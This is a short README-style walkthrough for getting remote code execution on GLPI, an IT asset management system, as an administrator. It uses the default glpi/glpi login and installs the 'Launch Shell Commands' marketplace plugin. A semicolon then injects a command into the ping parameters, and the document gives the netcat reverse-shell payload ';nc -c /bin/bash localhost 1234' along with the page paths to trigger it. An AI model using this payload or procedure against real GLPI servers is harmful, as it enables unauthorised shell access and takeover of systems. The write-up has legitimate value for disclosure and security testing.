# GLPI-RCE-Authenticated
How to RCE as a glpi administrator

``
Gestionnaire Libre de Parc Informatique (GLPI) is a Free Asset and IT Management Software package, that provides ITIL Service Desk features, licenses tracking and software auditing.
``

https://github.com/glpi-project/glpi

## Requirements

You need to be super administrator of glpi to add the plugin and perform the rce.<br>The default login is **glpi / glpi**

## Exploitation 

The technique consists in using a plugin which allows to execute commands on the system like ping or tracert and to divert it towards the reverse shell for example.


Initially you must add a key "GLPI network" in the general parameters of glpi what gives the rights to add extensions, you have just to create an account for free on the site of glpi and to copy paste the key.<br>
https://services.glpi-network.com/register

![](https://i.imgur.com/CuNnAFw.png)

![](https://i.imgur.com/o4HQRnH.png)

in the Marketplace : ``/glpi/front/marketplace.php``<br>
Add the plugin named "Launch Shell Commands"

![](https://i.imgur.com/HO9rTMo.png)

Edit the ping command page : ``/glpi/marketplace/shellcommands/front/shellcommand.form.php?id=1``

Enter a random string in the tag and in the parameters you can run anything as a command using a semicolon<br>
You can use this payload for reverse shell :
```sh 
;nc -c /bin/bash localhost 1234
```

It is simply an "exec" of all the arguments there are no filters<br>
We control the variable $commandToExec

![image](https://user-images.githubusercontent.com/69597623/189349689-45af6cd0-9611-4a85-b561-4219da114738.png)

![](https://i.imgur.com/0vuQnGF.png)

Add a ping command group : ``/glpi/marketplace/shellcommands/front/commandgroup.php``

![](https://i.imgur.com/CKQkOS2.png)

To finish to execute the payload: ``/glpi/marketplace/shellcommands/front/advanced_execution.php``<br>
Select the ping command group, a category and a device from the list (if you don't have one you can create one in Assets)

![](https://i.imgur.com/3ZnE7eJ.png)
![](https://i.imgur.com/zlns3aD.png)

